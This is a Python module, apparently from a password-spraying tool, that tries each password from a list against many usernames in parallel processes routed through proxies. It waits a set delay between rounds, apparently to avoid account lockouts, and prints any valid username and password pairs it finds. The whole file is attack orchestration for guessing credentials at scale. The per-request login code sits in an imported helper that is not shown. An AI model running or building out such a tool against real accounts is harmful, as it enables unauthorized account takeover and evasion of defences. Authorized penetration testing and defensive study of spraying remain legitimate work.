from datetime import datetime, timedelta
from multiprocessing import Process, Queue
from . import utils
import pause

def main(args, proxies, spray_config):
    results = []
    password_id = 0

    while password_id < len(args.passwords):
        password = args.passwords[password_id]
        next_start_time = datetime.now() + timedelta(minutes=args.delay)
        print(f"Beginning spray with password '{password}'")

        user_chunks = split_usernames(args.usernames, proxies)
        queue = Queue()
        processes = launch_spray_processes(spray_config, proxies, user_chunks, password, queue)

        for p in processes:
            p.join()

        results.extend(collect_results(queue))

        password_id += 1
        print(f"Spray of password '{password}' complete.", end=" ")
        if password_id < len(args.passwords):
            print(f"Waiting until {next_start_time.strftime('%H:%M')} to start next spray.")
            report_valid_credentials(results)
            pause.until(next_start_time)
        else:
            print("All passwords complete.")

    return results


def split_usernames(usernames, proxies):
    chunk_size = (len(usernames) + len(proxies) - 1) // len(proxies)
    return [usernames[i:i + chunk_size] for i in range(0, len(usernames), chunk_size)]


def launch_spray_processes(spray_config, proxies, user_chunks, password, queue):
    processes = []
    for proxy, user_chunk in zip(proxies, user_chunks):
        credentials = [{'USERNAME': username, 'PASSWORD': password} for username in user_chunk]
        p = Process(target=utils.perform_spray, args=(spray_config, credentials, proxy, queue))
        p.start()
        processes.append(p)
    return processes


def collect_results(queue):
    results = []
    while not queue.empty():
        results.extend(queue.get())
    return results


def report_valid_credentials(results):
    valid = [entry for entry in results if entry['RESULT'] == 'SUCCESS']
    if valid:
        print("Valid Credentials Found:")
        for entry in valid:
            print(f"{entry['USERNAME']} - {entry['PASSWORD']}")
        print()